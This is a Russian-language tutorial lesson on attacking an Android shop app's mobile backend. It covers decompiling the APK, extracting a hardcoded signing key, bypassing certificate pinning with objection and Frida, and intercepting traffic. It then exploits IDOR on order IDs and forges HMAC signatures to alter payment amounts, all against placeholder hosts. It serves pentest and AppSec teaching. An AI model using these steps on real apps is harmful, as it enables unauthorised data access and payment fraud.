## Вопрос, с которого всё начинается

Веб-версию магазина ты протестировал и ничего не нашёл. А потом вспомнил: у магазина есть мобильное приложение, и оно ходит не в веб-API, а в отдельный бэкенд. Часто он **менее защищён**: там есть эндпоинты, которых нет в вебе, он больше доверяет клиенту, а «защита» вроде certificate pinning обходится.

Сегодня мы возьмём APK приложения и пройдём путь: реверс → обход pinning → перехват трафика → IDOR на мобильном API.

## Наш пример: APK приложения

У нас есть файл `com.shop.app.apk` — установочный пакет Android-приложения. `.apk` — это zip-архив, внутри которого лежит код (в виде байткода) и ресурсы. Задача: вытащить оттуда, **куда** приложение ходит и **как** подписывает запросы.

## Шаг 1: реверс — эндпоинты и секреты

Распаковываем и декомпилируем. `apktool` разбирает ресурсы, `jadx` превращает байткод в читаемый Java:

```bash
$ apktool d com.shop.app.apk -o app_src
$ jadx --deobf com.shop.app.apk -d app_java
$ grep -rhoE 'https?://[a-zA-Z0-9./_-]+' app_java | sort -u | head
https://mapi.example/v2/
https://mapi.example/v2/orders
https://mapi.example/v2/pay
```

Обрати внимание: домен `mapi.example` — не тот, что у веба (`api.example`). Это и есть отдельный мобильный бэкенд. Теперь ищем секреты — ключи API и ключ подписи:

```bash
$ strings com.shop.app.apk | grep -Ei 'api_key|secret|bearer|firebase' | sort -u
sign_key=s3cr3t-mobile-key
X-Sign
```

Строка `sign_key=s3cr3t-mobile-key` — это ключ, которым приложение подписывает запросы. Он **зашит в клиент**, а значит, не является секретом: любой, кто распакует APK, его получит.

## Шаг 2: обходим certificate pinning

Прежде чем перехватить трафик, нужно обойти **pinning**. Это проверка, при которой приложение доверяет только «своему» сертификату и отвергает твой MITM-прокси. Обход по возрастанию сложности:

```bash
$ objection -g com.shop.app explore
# в сессии:
com.shop.app on (android: 13) [usb] # android sslpinning disable
```

`objection` подключается к запущенному приложению через Frida и на лету отключает проверки SSL. Если не сработало — пробуй Frida-скрипт `frida-multiple-unpinning`, патч APK (`apk-mitm`) или удаление проверок вручную и пересборку с `apktool b` + `apksigner`.

## Шаг 3: перехватываем поток

С обойдённым pinning включаем прокси и **ходим по всем экранам** приложения — только так видно все вызовы:

```bash
$ mitmproxy --mode regular --listen-port 8080 -w flows.mitm
```

В потоке нас интересуют заголовки и структура запросов:

```http
GET /v2/orders/1001 HTTP/1.1
Host: mapi.example
Authorization: Bearer eyJ...
X-App-Version: 4.2.1
X-Platform: android
```

Приложение шлёт `X-Platform: android` и версию — сервер может доверять этим заголовкам. А `GET /v2/orders/1001` — это ровно та ручка, которую мы проверим на IDOR.

## Шаг 4: атакуем — IDOR/BOLA

Мы авторизованы своим токеном и запрашиваем **свой** заказ `1001`. Теперь меняем ID на соседний — это проверка «а это мой объект?»:

```bash
$ curl -s "https://mapi.example/v2/orders/1002" -H "Authorization: Bearer $TOKEN"
{"id":1002,"total":9000,"owner":"victim@corp.com"}
```

Сервер вернул чужой заказ. Это **IDOR/BOLA**: авторизация есть, проверки владельца нет. Мобильные API особенно склонны к этому, потому что полагаются на «правильный» клиент и не проверяют объект на уровне функции.

## Шаг 5: подпись запросов

Многие мобильные API подписывают каждый запрос HMAC-ключом, чтобы запрос нельзя было изменить. Но ключ мы уже достали из APK. Зная алгоритм (`X-Sign = HMAC-SHA256(secret, body + timestamp)`), воспроизводим подпись:

```bash
$ ts=$(date +%s); body='{"amount":1}'
$ sign=$(printf '%s%s' "$body" "$ts" | openssl dgst -sha256 -hmac 's3cr3t-mobile-key' | awk '{print $2}')
$ curl -s -X POST "https://mapi.example/v2/pay" \
>   -H "X-Sign: $sign" -H "X-Timestamp: $ts" -d "$body"
{"status":"ok","charged":1}
```

Теперь меняем `amount` на большое значение — подпись всё равно валидна, потому что ключ у нас. Если сервер при этом не проверяет целостность, можно изменить сумму платежа. Подпись, целиком вычисляемая на клиенте, защитой не является.

## Если не сработало

- Pinning не обходится `objection` — попробуй нативный Frida-хук на `SSL_write`/`X509TrustManager`, патч `network_security_config.xml` или декомпиляцию и правку проверок вручную.
- Ключ подписи обфусцирован — найди место его сборки в `jadx`, поставь Frida-хук на функцию-генератор подписи и перехвати готовое значение.
- Трафик зашифрован поверх TLS (свой протокол) — ищи в нативном коде (`.so`) точки шифрования, хукай их.
- Мобильные эндпоинты защищены лучше веба — проверь **старые версии** (`/v1/`), а также GraphQL/JSON-RPC, которые часто подключены рядом.

## Что искать в APK и чем

Реверс APK — это по сути поиск строк. Полезно держать под рукой таблицу «что искать → что найдёшь»:

| Строка поиска | Что найдёте |
|---------------|-------------|
| `api_key`, `apiKey` | ключи API |
| `Bearer ` | схему авторизации и токены |
| `secret`, `sign` | ключ подписи запросов |
| `firebase`, `google_api` | конфиги облака |
| `http://` | незашифрованные эндпоинты |
| `debug`, `admin`, `internal` | скрытые маршруты |
| `password`, `passwd` | захардкоженные креды |

Инструменты для каждого этапа:

```bash
$ apktool d app.apk -o app_src          # распаковка ресурсов
$ jadx --deobf app.apk -d app_java      # декомпиляция в Java
$ frida -U -f com.shop.app -l unpinning.js --no-pause   # обход pinning
$ mitmdump -nr flows.dump "~u /v2/"     # фильтр по мобильному API
```

`frida` — это динамическая инструментация: ты внедряешь свой JS в работающее приложение и можешь подменять функции (проверку SSL, генерацию подписи). `MobSF` прогоняет статический и динамический анализ APK автоматически и хорошо подходит для первого прохода.

## Что мы теперь знаем

- Мобильное приложение ходит в отдельный бэкенд (`mapi.`), часто менее защищённый, чем веб.
- `apktool`/`jadx` вытаскивают эндпоинты и **зашитые секреты** (ключ подписи, API-ключи).
- Certificate pinning обходится `objection`/Frida/патчем APK.
- Перехват потока даёт карту API: ручки, заголовки, версии.
- Мобильные API часто доверяют клиенту и не проверяют владельца объекта → IDOR/BOLA.
- Подпись, вычисляемая на клиенте из зашитого ключа, обходится воспроизведением.

## На что смотреть дальше

- Не ограничивайся веб-API — у приложения свой набор эндпоинтов.
- Не сдавайся на pinning: он обходится Frida/Objection/патчем.
- Ходи по **всем** экранам приложения — часть эндпоинтов видна только при использовании.
- Проверяй доверие к заголовкам платформы/версии (`X-Platform`, `X-App-Version`).
- Не забывай про старые версии API и про секреты, зашитые в клиент.
- Проверяй, **где** проверяется авторизация: если она только на HTTP-слое, подписки GraphQL по WebSocket могут быть без проверки.

## Куда дальше

В следующем уроке мы вернёмся к GraphQL и разберём его **глубоко**: обход выключенной интроспекции, batching/aliasing для обхода лимитов, DoS через вложенность. А пока главное запомни: мобильное приложение — это ещё один клиент к тому же бэкенду, и часто именно через него видно то, что скрыто от веба.

## Где пригодится

- **CTF (Web/Mobile):** задачи на мобильный API и реверс приложения.
- **Bug bounty:** мобильные API дают много находок (IDOR, утечки ключей).
- **Пентест:** аудит мобильных приложений (OWASP MASTG).
- **Работа (AppSec):** server-side авторизация, отсутствие секретов в клиенте, pinning.
